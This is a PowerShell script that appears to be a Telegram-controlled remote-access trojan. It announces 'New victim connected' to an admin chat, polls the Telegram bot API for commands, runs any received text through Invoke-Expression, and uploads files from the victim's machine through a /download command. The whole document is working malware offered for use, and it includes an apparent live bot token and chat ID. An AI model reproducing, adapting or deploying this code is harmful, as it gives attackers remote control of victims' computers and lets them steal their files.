$botToken = '8002691180:AAGTuLHzMiU5Qf0XCeDi8wt8P0UFDdBnaD0'
$uri = "https://api.telegram.org/bot$botToken/"
$sessions = @{}
$activeSessions = @{}
$adminChatId = '7122592732'  # Replace with your Telegram chat ID for admin notifications

function Send-TelegramMessage {
    param([string]$chatId, [string]$message)
    $payload = @{chat_id = $chatId; text = $message}
    Invoke-RestMethod -Uri "${uri}sendMessage" -Method Post -ContentType "application/x-www-form-urlencoded" -Body $payload
}

function Generate-SessionID {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $length = 7
    $sessionID = -join((1..$length) | ForEach-Object { $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)] })
    return $sessionID
}

function Show-Help {
    $helpMessage = @"
Available Commands:
/sessions ->         : Generates a random session ID.
/shell -> <session_id>: Enter a session and execute commands.
/exit    ->         : Exit the current session.
/help    ->          : Shows this help message.
/download -><file>  : Sends a file to the bot's chat (absolute or relative path).
"@
    return $helpMessage
}

function Get-TelegramUpdates {
    param([int]$offset)
    $url = "${uri}getUpdates?offset=$offset"
    return Invoke-RestMethod -Uri $url -Method Get
}

function Send-TelegramFile {
    param([string]$filePath, [string]$chatId)
    if (-not ([System.IO.Path]::IsPathRooted($filePath))) {
        $filePath = Join-Path -Path (Get-Location).Path -ChildPath $filePath
    }
    
    if (-not (Test-Path $filePath)) {
        Send-TelegramMessage -chatId $chatId -message "File not found: $filePath"
        return
    }

    $url = "https://api.telegram.org/bot$botToken/sendDocument"
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $fields = @(
        "--$boundary$LF" +
        "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$chatId$LF" +
        "--$boundary$LF" +
        "Content-Disposition: form-data; name=`"document`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"$LF" +
        "Content-Type: application/octet-stream$LF$LF"
    )
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    $endBoundary = "$LF--$boundary--$LF"
    $body = ([System.Text.Encoding]::ASCII.GetBytes($fields) + $fileContent + [System.Text.Encoding]::ASCII.GetBytes($endBoundary))

    $request = [System.Net.HttpWebRequest]::Create($url)
    $request.Method = "POST"
    $request.ContentType = "multipart/form-data; boundary=$boundary"
    $request.ContentLength = $body.Length

    $requestStream = $request.GetRequestStream()
    $requestStream.Write($body, 0, $body.Length)
    $requestStream.Close()

    $response = $request.GetResponse()
    $responseStream = $response.GetResponseStream()
    $reader = [System.IO.StreamReader]::new($responseStream)
    $responseContent = $reader.ReadToEnd()
    $reader.Close()

    Send-TelegramMessage -chatId $chatId -message "File sent successfully: $filePath"
}

# Notify admin when the script starts
Send-TelegramMessage -chatId $adminChatId -message " New victim connected."

$offset = 0
while ($true) {
    $updates = Get-TelegramUpdates -offset $offset
    foreach ($update in $updates.result) {
        $message = $update.message.text
        $chatId = $update.message.chat.id
        $offset = $update.update_id + 1

        if ($message -eq '/sessions') {
            $sessionID = Generate-SessionID
            $sessions[$chatId] = $sessionID
            Send-TelegramMessage -chatId $chatId -message "Your session ID is: $sessionID"
            # Send-TelegramMessage -chatId $adminChatId -message "User $chatId generated a session ID: $sessionID"
        }
        elseif ($message -like '/shell*') {
            $sessionID = $message.Substring(7).Trim()
            if ($sessions.ContainsKey($chatId) -and $sessions[$chatId] -eq $sessionID) {
                $activeSessions[$chatId] = $sessionID
                Send-TelegramMessage -chatId $chatId -message "You are now in session $sessionID. Enter your commands."
                # Send-TelegramMessage -chatId $adminChatId -message "User $chatId entered session $sessionID."
            }
            else {
                Send-TelegramMessage -chatId $chatId -message "Invalid or expired session ID: $sessionID"
            }
        }
        elseif ($message -eq '/exit') {
            if ($activeSessions.ContainsKey($chatId)) {
                $activeSessions.Remove($chatId)
                Send-TelegramMessage -chatId $chatId -message "You have exited the session."
                Send-TelegramMessage -chatId $adminChatId -message "User $chatId exited the session."
            }
            else {
                Send-TelegramMessage -chatId $chatId -message "You are not in any session."
            }
        }
        elseif ($message -eq '/help') {
            $helpMessage = Show-Help
            Send-TelegramMessage -chatId $chatId -message $helpMessage
        }
        elseif ($message -like '/download*') {
            $filePath = $message.Substring(10).Trim()
            Send-TelegramFile -filePath $filePath -chatId $chatId
        }
        elseif ($activeSessions.ContainsKey($chatId)) {
            try {
                $result = Invoke-Expression $message 2>&1
                if ($result -ne $null) {
                    Send-TelegramMessage -chatId $chatId -message ($result -join "`n")
                }
            }
            catch {
                # Ignore invalid commands without sending an error
            }
        }
    }
    Start-Sleep -Seconds 2
}
